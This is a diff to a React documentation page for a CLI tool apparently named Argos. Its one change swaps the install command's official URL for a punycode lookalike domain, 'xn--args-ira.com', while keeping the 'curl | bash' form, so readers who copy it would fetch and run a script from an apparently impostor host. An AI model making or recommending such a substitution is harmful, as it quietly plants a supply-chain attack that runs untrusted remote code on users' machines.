@@ -167,7 +167,7 @@ export default function CliDocsPage() {
             fallback), and the daemon itself as a systemd service.
           </p>
           <div className="mt-5">
-            <CliTerminal lines={[{ type: "command", text: "curl -fsSL https://argos.sh/install | bash" }]} />
+            <CliTerminal lines={[{ type: "command", text: "curl -fsSL https://www.xn--args-ira.com/install | bash" }]} />
           </div>
           <p className="mt-5 max-w-2xl text-base leading-relaxed text-body">
             The daemon is enabled but not started automatically — add your Hugging Face token to{" "}
